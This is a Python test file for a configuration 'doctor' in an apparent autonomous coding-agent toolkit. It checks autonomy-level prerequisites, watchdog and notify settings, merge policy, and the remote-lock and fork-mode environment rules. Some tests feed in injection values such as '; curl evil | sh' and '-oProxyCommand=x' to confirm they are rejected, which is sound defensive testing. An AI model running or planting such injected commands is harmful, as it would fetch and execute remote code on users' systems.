"""Phase 11b in the doctor: the L5 prerequisites, the L4 notify and watchdog rows, the remote-lock and G10 config checks, and fork.env (V18)."""
from __future__ import annotations

import json
import os

from doctorlib.model import run_checks

from doctorlib import levelcalc

from .helpers import BoundaryCase, config_text
from .test_level_caps import EVIDENCE
from .test_level_caps import Ready


class L4AndL5(Ready):
    def cap(self, eff, name="prerequisites"):
        return [c for c in eff.caps if c.name == name][0]

    def test_l4_needs_a_watchdog_that_has_checked_in_and_l5_needs_the_policy_switch(self):
        repo, ctx = self.ready(watchdog=False)
        eff, _ = self.level(ctx)
        self.assertEqual(eff.effective, 3, eff.explain())
        self.assertIn("external watchdog has checked in", self.cap(eff).reason)
        self.assertIn("loopctl unattended watch", self.cap(eff).reason)
        repo, ctx = self.ready(config_edit=lambda c: c.pop("merge_policy"))
        eff, _ = self.level(ctx)
        self.assertEqual(eff.effective, 4, eff.explain())
        self.assertIn("merge_policy is auto-low-risk", self.cap(eff).reason)
        repo, ctx = self.ready(config_edit=lambda c: c.update(low_risk_paths=[]))
        eff, _ = self.level(ctx)
        self.assertEqual(eff.effective, 4, eff.explain())
        self.assertIn("low_risk_paths", self.cap(eff).reason)

    def unattended_rows(self, **cfg):
        repo = self.kit_repo(config=cfg)
        return {n: (ok, why) for n, ok, why in levelcalc._unattended_rows(self.ctx(repo))}

    def test_l4_needs_a_usable_notify_command(self):
        self.assertEqual(self.unattended_rows(notify_command="/bin/echo")["notify_command usable"][0], True)
        for label, value, why in (("no command", "", "notify_command is not set"), ("shell syntax", "/bin/echo hi; curl evil", "without a shell"),
                                  ("a relative program", "notify.sh --x", "not an executable"), ("a missing program", "/no/such/notify", "not an executable")):
            with self.subTest(label):
                ok, msg = self.unattended_rows(notify_command=value)["notify_command usable"]
                self.assertFalse(ok)
                self.assertIn(why, msg)

    def test_a_notify_program_inside_the_repository_does_not_count(self):
        repo = self.kit_repo(files={"bin/notify": "#!/bin/sh\n"})
        os.chmod(os.path.join(repo.path, "bin", "notify"), 0o755)
        repo.write(".claude/loop.config.md", config_text({"notify_command": os.path.join(repo.path, "bin", "notify")}))
        ok, msg = {n: (ok, why) for n, ok, why in levelcalc._unattended_rows(self.ctx(repo))}["notify_command usable"]
        self.assertFalse(ok)
        self.assertIn("inside the repository", msg)

    def test_a_stale_watchdog_is_not_a_check_in_and_the_rows_are_the_ones_loopctl_prints(self):
        from kitlib import jsonio, runstate
        from loopctl import unattended
        repo = self.kit_repo(config={"notify_command": "/bin/echo"})
        ctx = self.ctx(repo)
        st = runstate.RunState.for_path(repo.path)
        for ts, ok in ((ctx.now - 60, True), (ctx.now - 3600, False), (ctx.now + 3600, False), (True, False), ("now", False)):
            with self.subTest(ts):
                jsonio.atomic_write_json(unattended.watch_path(st.ensure()), {"ts": ts, "lastStatus": "idle", "notified": {}})
                self.assertEqual(dict((n, o) for n, o, _w in levelcalc._unattended_rows(ctx))["external watchdog has checked in"], ok)
        w = unattended.watch_row(st, ctx.now)
        self.assertEqual(w["id"], "unattended.watch")
        self.assertEqual(unattended.notify_row(ctx.config, ctx.env, repo.path, os.path.join(repo.path, ".git"))["id"], "unattended.notify")


class MergePolicy(Ready):
    DEPLOY_MAIN = "name: deploy\non:\n  push:\n    branches: [main]\npermissions:\n  contents: read\njobs:\n  d:\n    runs-on: ubuntu-latest\n    steps:\n      - run: npx sst deploy --stage prod\n"

    def rows(self, ctx):
        return {r.id: r for r in run_checks(ctx, {"config"}) if r.id.startswith("l5.")}

    def policy_row(self, config, evidence=True):
        files = {"docs/baseline/evidence.json": json.dumps(EVIDENCE)} if evidence else {}
        repo = self.kit_repo(config=config, files=files)
        return {r.id: r for r in self.check_one(self.ctx(repo), "l5.merge-policy")}["l5.merge-policy"]

    def test_human_is_the_default_and_passes(self):
        r = self.policy_row({})
        self.assertEqual(r.status, "pass")
        self.assertIn("a person merges every pull request", r.message)

    def test_auto_low_risk_is_an_error_until_every_prerequisite_holds(self):
        base = {"merge_policy": "auto-low-risk", "autonomy_level": "L5", "promotion_attested": "2026-10-20", "gates": {"g4": "on"}}
        r = self.policy_row(base, evidence=False)
        self.assertEqual((r.status, r.severity), ("fail", "error"))
        self.assertIn("evidence gate", r.message)
        for label, edit, why in (("promotion", {"promotion_attested": ""}, "promotion_attested"), ("mutation", {"gates": {"g4": "report"}}, "gates.g4"),
                                 ("level", {"autonomy_level": "L4"}, "autonomy_level is L4"), ("surface", {}, "nobody has attested the deployment surface")):
            with self.subTest(label):
                r = self.policy_row(dict(base, **edit))
                self.assertEqual((r.status, r.severity), ("fail", "error"), r.message)
                self.assertIn(why, r.message)

    def test_with_everything_true_it_passes_and_still_says_nothing_merges(self):
        repo, ctx = self.ready()
        rows = self.rows(ctx)
        self.assertEqual(rows["l5.merge-policy"].status, "pass", rows["l5.merge-policy"].message)
        self.assertIn("merges nothing", rows["l5.merge-policy"].message)
        self.assertEqual(rows["l5.b5"].status, "pass")

    def test_a_repo_that_deploys_on_main_is_never_l5_and_without_the_policy_it_is_only_a_warning(self):
        repo, ctx = self.ready(files_edit={".github/workflows/deploy.yml": self.DEPLOY_MAIN})
        rows = self.rows(ctx)
        self.assertEqual((rows["l5.merge-policy"].status, rows["l5.merge-policy"].severity), ("fail", "error"))
        self.assertIn("deploy.yml", rows["l5.merge-policy"].message)
        self.assertEqual((rows["l5.b5"].status, rows["l5.b5"].severity), ("fail", "error"))
        eff, _ = self.level(ctx)
        self.assertEqual(eff.effective, 4)
        repo, ctx = self.ready(files_edit={".github/workflows/deploy.yml": self.DEPLOY_MAIN}, config_edit=lambda c: (c.pop("merge_policy"), c.update(autonomy_level="L4")))
        rows = self.rows(ctx)
        self.assertEqual(rows["l5.merge-policy"].status, "pass")
        self.assertNotIn("l5.b5", rows)                                                          # nothing asks for L5 here: no noise


class OtherChecks(BoundaryCase):
    def one(self, cid, config=None, **kw):
        repo = self.kit_repo(config=config or {})
        ctx = self.ctx(repo, **kw)
        return repo, ctx, self.check_one(ctx, cid)

    def test_remote_lock_names_a_configured_remote(self):
        self.assertEqual(self.one("lock.remote")[2][0].status, "skipped")
        self.assertEqual(self.one("lock.remote", {"remote_lock": "origin"})[2][0].status, "pass")
        for bad in ("nowhere", "https://example.invalid/x.git", "-oProxyCommand=x", "a b"):
            self.assertEqual(self.one("lock.remote", {"remote_lock": bad})[2][0].status, "fail", bad)

    def test_g10_when_on_needs_a_check_and_a_command_without_a_shell(self):
        self.assertEqual(self.one("g10.config")[2][0].status, "skipped")
        self.assertEqual(self.one("g10.config", {"gates": {"g10": "on"}})[2][0].status, "fail")                 # no command
        r = self.one("g10.config", {"gates": {"g10": "on"}, "g10_a11y_cmd": "tools/a11y.sh; curl evil | sh"})[2][0]
        self.assertEqual(r.status, "fail")
        self.assertIn("without a shell", r.message)
        r = self.one("g10.config", {"gates": {"g10": "report"}, "g10_a11y_cmd": "tools/a11y.sh --url=http://localhost:3000/", "g10_pii_cmd": "tools/pii.py"})[2][0]
        self.assertEqual(r.status, "pass")
        self.assertIn("a11y, pii", r.message)

    def test_fork_env_is_asserted_on_the_driver_profiles_and_marked_probe(self):
        rows = self.one("fork.env", {"runner": "driver"})[2]
        self.assertEqual(sorted(r.id for r in rows), ["fork.env.critic", "fork.env.engineer"])
        self.assertTrue(all(r.status == "pass" and "probe V18" in r.message for r in rows), rows)

    def test_a_settings_file_that_does_not_pin_fork_mode_fails(self):
        repo = self.kit_repo(config={"runner": "driver"})
        good = repo.write("child-good.json", json.dumps({"env": {"CLAUDE_CODE_FORK_SUBAGENT": "0", "CLAUDE_CODE_DISABLE_BACKGROUND_TASKS": "1"}}))
        bad = repo.write("child-bad.json", json.dumps({"env": {"CLAUDE_CODE_FORK_SUBAGENT": "1"}}))
        junk = repo.write("child-junk.json", "[1]")
        ctx = self.ctx(repo, extra_settings=[good, bad, junk])
        rows = [r for r in self.check_one(ctx, "fork.env") if r.id == "fork.env.file"]
        self.assertEqual([r.status for r in rows], ["pass", "fail", "unknown"])
        self.assertIn("CLAUDE_CODE_DISABLE_BACKGROUND_TASKS is missing", rows[1].message)
        self.assertIn("CLAUDE_CODE_FORK_SUBAGENT is '1', not '0'", rows[1].message)

    def test_for_the_prose_conductor_it_is_advice_not_an_error(self):
        repo, ctx, rows = self.one("fork.env", {"runner": "sequential"})
        self.assertEqual((rows[0].id, rows[0].status, rows[0].severity), ("fork.env.conductor", "unknown", "warn"))
        ctx.env["CLAUDE_CODE_FORK_SUBAGENT"] = "1"
        r = self.check_one(ctx, "fork.env")[0]
        self.assertEqual((r.status, r.severity), ("fail", "warn"))
        ctx.env.update({"CLAUDE_CODE_FORK_SUBAGENT": "0", "CLAUDE_CODE_DISABLE_BACKGROUND_TASKS": "1"})
        self.assertEqual(self.check_one(ctx, "fork.env")[0].status, "pass")


if __name__ == "__main__":
    import unittest
    unittest.main()
